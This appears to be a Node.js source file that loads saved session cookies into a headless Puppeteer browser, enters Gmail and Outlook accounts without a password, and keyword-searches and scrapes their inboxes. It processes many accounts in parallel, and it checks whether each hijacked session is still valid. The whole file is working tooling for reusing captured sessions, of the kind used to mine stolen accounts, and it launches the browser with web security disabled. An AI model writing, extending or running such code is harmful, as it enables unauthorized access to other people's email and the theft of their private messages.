/**
 * Cookie-Based Inbox Handler
 *
 * Uses Puppeteer to load cookies and search email inboxes
 * Supports Gmail and Outlook
 */

const puppeteer = require('puppeteer');

/**
 * Search inbox using cookies
 * @param {Object} cookieData - Validated cookie data from cookieValidator
 * @param {Array} keywords - Keywords to search for
 * @param {number} maxResults - Maximum number of results to return (default: 50)
 * @param {boolean} headless - Run browser in headless mode (default: true)
 * @returns {Promise<Object>} - { success: boolean, matches: Array, error: string }
 */
async function searchInboxWithCookies(cookieData, keywords, maxResults = 50, headless = true) {
  let browser = null;

  try {
    const { email, provider, cookies } = cookieData;

    console.log(`[CookieInbox] Starting search for ${email} (${provider})`);

    // Launch browser
    browser = await puppeteer.launch({
      headless: headless ? 'new' : false,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-web-security',
        '--disable-features=IsolateOrigins,site-per-process'
      ]
    });

    const page = await browser.newPage();

    // Set user agent
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');

    // Set viewport
    await page.setViewport({ width: 1920, height: 1080 });

    // Navigate to provider-specific domain first
    const targetUrl = provider === 'gmail'
      ? 'https://mail.google.com'
      : 'https://outlook.live.com/mail';

    console.log(`[CookieInbox] Navigating to ${targetUrl}`);
    await page.goto(targetUrl, { waitUntil: 'networkidle0', timeout: 30000 });

    // Transform cookies to Puppeteer format
    // Cookie.txt uses 'expiry', but Puppeteer expects 'expires'
    const puppeteerCookies = cookies.map(cookie => ({
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      path: cookie.path || '/',
      expires: cookie.expiry || cookie.expires || -1, // Handle both formats
      httpOnly: cookie.httpOnly !== undefined ? cookie.httpOnly : false,
      secure: cookie.secure !== undefined ? cookie.secure : false,
      sameSite: cookie.sameSite || 'Lax'
    }));

    // Filter out expired cookies
    const now = Math.floor(Date.now() / 1000);
    const validCookies = puppeteerCookies.filter(cookie => {
      if (cookie.expires === -1) return true; // Session cookie
      return cookie.expires > now;
    });

    if (validCookies.length < puppeteerCookies.length) {
      console.log(`[CookieInbox] Filtered out ${puppeteerCookies.length - validCookies.length} expired cookies`);
    }

    // Set cookies
    console.log(`[CookieInbox] Setting ${validCookies.length} valid cookies`);
    await page.setCookie(...validCookies);

    // Reload page with cookies
    console.log(`[CookieInbox] Reloading with cookies`);
    await page.goto(targetUrl, { waitUntil: 'networkidle0', timeout: 30000 });

    // Wait a bit for cookies to take effect
    await page.waitForTimeout(3000);

    // Check if we're logged in
    const isLoggedIn = await checkLoginStatus(page, provider);

    if (!isLoggedIn) {
      throw new Error('Failed to authenticate with provided cookies. Cookies may be expired or invalid.');
    }

    console.log(`[CookieInbox] Successfully authenticated to ${provider}`);

    // Search for keywords
    const matches = await searchEmails(page, provider, keywords, maxResults);

    console.log(`[CookieInbox] Found ${matches.length} matches for ${email}`);

    return {
      success: true,
      email,
      provider,
      matchCount: matches.length,
      matches
    };

  } catch (err) {
    console.error('[CookieInbox] Error:', err.message);
    return {
      success: false,
      email: cookieData.email,
      provider: cookieData.provider,
      matchCount: 0,
      matches: [],
      error: err.message
    };
  } finally {
    if (browser) {
      await browser.close();
    }
  }
}

/**
 * Check if user is logged in
 * @param {Page} page - Puppeteer page
 * @param {string} provider - 'gmail' or 'outlook'
 * @returns {Promise<boolean>}
 */
async function checkLoginStatus(page, provider) {
  try {
    if (provider === 'gmail') {
      // Check for Gmail inbox elements
      const selectors = [
        '[gh="tl"]', // Gmail top toolbar
        '[role="navigation"][aria-label*="Mail"]', // Navigation
        'div[role="main"]', // Main content
        '[aria-label="Search mail"]' // Search box
      ];

      for (const selector of selectors) {
        const element = await page.$(selector);
        if (element) {
          console.log(`[CookieInbox] Found Gmail element: ${selector}`);
          return true;
        }
      }

      // Check URL
      const url = page.url();
      if (url.includes('mail.google.com') && !url.includes('signin')) {
        return true;
      }

    } else if (provider === 'outlook') {
      // Check for Outlook inbox elements
      const selectors = [
        '[aria-label="Folder pane"]',
        '[role="tree"][aria-label*="Folder"]',
        '[data-app-section="MailModule"]',
        '[aria-label*="Message list"]'
      ];

      for (const selector of selectors) {
        const element = await page.$(selector);
        if (element) {
          console.log(`[CookieInbox] Found Outlook element: ${selector}`);
          return true;
        }
      }

      // Check URL
      const url = page.url();
      if (url.includes('outlook.live.com/mail') || url.includes('outlook.office.com/mail')) {
        return true;
      }
    }

    return false;

  } catch (err) {
    console.error('[CookieInbox] Error checking login status:', err.message);
    return false;
  }
}

/**
 * Search emails for keywords
 * @param {Page} page - Puppeteer page
 * @param {string} provider - 'gmail' or 'outlook'
 * @param {Array} keywords - Keywords to search for
 * @param {number} maxResults - Maximum results to return
 * @returns {Promise<Array>}
 */
async function searchEmails(page, provider, keywords, maxResults) {
  if (provider === 'gmail') {
    return searchGmail(page, keywords, maxResults);
  } else if (provider === 'outlook') {
    return searchOutlook(page, keywords, maxResults);
  } else {
    throw new Error(`Unsupported provider: ${provider}`);
  }
}

/**
 * Search Gmail for keywords
 * @param {Page} page - Puppeteer page
 * @param {Array} keywords - Keywords to search for
 * @param {number} maxResults - Maximum results
 * @returns {Promise<Array>}
 */
async function searchGmail(page, keywords, maxResults) {
  const allMatches = [];

  try {
    for (const keyword of keywords) {
      if (allMatches.length >= maxResults) break;

      console.log(`[Gmail] Searching for: ${keyword}`);

      // Find search box
      const searchBoxSelector = 'input[aria-label="Search mail"]';
      await page.waitForSelector(searchBoxSelector, { timeout: 10000 });

      // Clear and type keyword
      await page.click(searchBoxSelector);
      await page.evaluate((sel) => {
        document.querySelector(sel).value = '';
      }, searchBoxSelector);
      await page.type(searchBoxSelector, keyword);
      await page.keyboard.press('Enter');

      // Wait for results
      await page.waitForTimeout(3000);

      // Extract email data
      const emails = await page.evaluate(() => {
        const results = [];
        const rows = document.querySelectorAll('tr[role="row"]');

        rows.forEach(row => {
          try {
            const subjectEl = row.querySelector('span[data-thread-id]');
            const senderEl = row.querySelector('[email]');

            if (subjectEl) {
              const subject = subjectEl.textContent.trim();
              const sender = senderEl ? senderEl.getAttribute('email') : 'Unknown';
              const snippet = row.querySelector('.y2')?.textContent.trim() || '';

              results.push({
                from: sender,
                subject,
                snippet,
                date: new Date().toISOString()
              });
            }
          } catch (err) {
            // Skip invalid rows
          }
        });

        return results;
      });

      console.log(`[Gmail] Found ${emails.length} emails for keyword: ${keyword}`);

      // Add to results
      emails.forEach(email => {
        if (allMatches.length < maxResults) {
          allMatches.push({
            ...email,
            keyword
          });
        }
      });

      // Go back to inbox
      await page.goto('https://mail.google.com/mail/u/0/#inbox', { waitUntil: 'networkidle0' });
      await page.waitForTimeout(2000);
    }

  } catch (err) {
    console.error('[Gmail] Search error:', err.message);
  }

  return allMatches;
}

/**
 * Search Outlook for keywords
 * @param {Page} page - Puppeteer page
 * @param {Array} keywords - Keywords to search for
 * @param {number} maxResults - Maximum results
 * @returns {Promise<Array>}
 */
async function searchOutlook(page, keywords, maxResults) {
  const allMatches = [];

  try {
    for (const keyword of keywords) {
      if (allMatches.length >= maxResults) break;

      console.log(`[Outlook] Searching for: ${keyword}`);

      // Find search box
      const searchBoxSelector = 'input[aria-label*="Search"]';
      await page.waitForSelector(searchBoxSelector, { timeout: 10000 });

      // Clear and type keyword
      await page.click(searchBoxSelector);
      await page.evaluate((sel) => {
        const input = document.querySelector(sel);
        if (input) input.value = '';
      }, searchBoxSelector);
      await page.type(searchBoxSelector, keyword);
      await page.keyboard.press('Enter');

      // Wait for results
      await page.waitForTimeout(4000);

      // Extract email data
      const emails = await page.evaluate(() => {
        const results = [];
        const rows = document.querySelectorAll('[role="listitem"][data-convid]');

        rows.forEach(row => {
          try {
            const subjectEl = row.querySelector('[aria-label*="Subject"]');
            const senderEl = row.querySelector('[title]');

            if (subjectEl && senderEl) {
              const subject = subjectEl.textContent.trim();
              const sender = senderEl.getAttribute('title') || senderEl.textContent.trim();
              const snippet = row.querySelector('[class*="preview"]')?.textContent.trim() || '';

              results.push({
                from: sender,
                subject,
                snippet,
                date: new Date().toISOString()
              });
            }
          } catch (err) {
            // Skip invalid rows
          }
        });

        return results;
      });

      console.log(`[Outlook] Found ${emails.length} emails for keyword: ${keyword}`);

      // Add to results
      emails.forEach(email => {
        if (allMatches.length < maxResults) {
          allMatches.push({
            ...email,
            keyword
          });
        }
      });

      // Go back to inbox
      await page.goto('https://outlook.live.com/mail/0/inbox', { waitUntil: 'networkidle0' });
      await page.waitForTimeout(2000);
    }

  } catch (err) {
    console.error('[Outlook] Search error:', err.message);
  }

  return allMatches;
}

/**
 * Process multiple cookie accounts in parallel
 * @param {Array} cookieDataArray - Array of validated cookie data
 * @param {Array} keywords - Keywords to search for
 * @param {Function} progressCallback - Called with progress updates
 * @param {number} maxResults - Maximum results per account
 * @param {number} concurrency - Number of parallel searches (default: 3)
 * @returns {Promise<Array>}
 */
async function searchMultipleAccounts(cookieDataArray, keywords, progressCallback, maxResults = 50, concurrency = 3) {
  const results = [];
  const chunks = [];

  // Split into chunks for concurrency control
  for (let i = 0; i < cookieDataArray.length; i += concurrency) {
    chunks.push(cookieDataArray.slice(i, i + concurrency));
  }

  let completed = 0;
  const total = cookieDataArray.length;

  for (const chunk of chunks) {
    const promises = chunk.map(async (cookieData) => {
      try {
        progressCallback({
          type: 'progress',
          email: cookieData.email,
          status: 'searching'
        });

        const result = await searchInboxWithCookies(cookieData, keywords, maxResults, true);

        completed++;
        progressCallback({
          type: 'result',
          email: cookieData.email,
          result,
          progress: { completed, total }
        });

        return result;

      } catch (err) {
        completed++;
        const errorResult = {
          success: false,
          email: cookieData.email,
          provider: cookieData.provider,
          error: err.message,
          matches: [],
          matchCount: 0
        };

        progressCallback({
          type: 'error',
          email: cookieData.email,
          error: err.message,
          progress: { completed, total }
        });

        return errorResult;
      }
    });

    const chunkResults = await Promise.all(promises);
    results.push(...chunkResults);
  }

  return results;
}

module.exports = {
  searchInboxWithCookies,
  searchMultipleAccounts,
  checkLoginStatus
};
